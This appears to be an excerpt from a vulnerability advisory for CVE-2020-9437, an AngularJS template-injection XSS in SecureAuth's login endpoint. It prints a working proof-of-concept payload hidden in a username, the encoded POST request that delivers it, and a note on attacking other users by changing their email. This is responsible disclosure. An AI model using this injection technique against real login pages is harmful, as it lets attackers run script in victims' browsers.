| [CVE-2020-9437](https://nvd.nist.gov/vuln/detail/CVE-2020-9437) | Low | Cross-site scripting | Remote |

The `/SecureAuth.aspx` endpoint's rendering of user-controlled username and email values is vulnerable to AngularJS client-side template injection. XSS payloads contained in the username or email can be executed during the authentication process.

The following AngularJS expression was used to execute a proof-of-concept Javascript payload:

```
b@{{constructor.constructor('alert(window.location)')()}}.o

```

The username containing the payload was used to log in, as shown in the request below:

```
POST /[REDACTED]/SecureAuth.aspx?client_id=[REDACTED]
…omitted for brevity…
```
```
&ctl00%24ContentPlaceHolder1%24MFALoginControl1%24UserIDView%24ctl00%24ContentPlaceHolder1_MFALoginControl1_UserIDView_txtUserid=b%40%7B%7Bconstructor.constructor%28%27alert%28window.location%29%27%29%28%29%7D%7D.o&ctl00%24ContentPlaceHolder1%24MFALoginControl1%24UserIDView%24ctl00%24ContentPlaceHolder1_MFALoginControl1_UserIDView_btnSubmit=Submit
```

After submitting the request, the payload executed on the page, as shown below:

******Figure**** ****3**** ****–**** JavaScript alerting*`window.location`*

The payload triggered as an error during the sign-in process, resulting in self-XSS. Alternatively, an attacker could change the email address of another user, such as a malicious administrator, and would be able to use this attack to perform XSS against users during authentication.
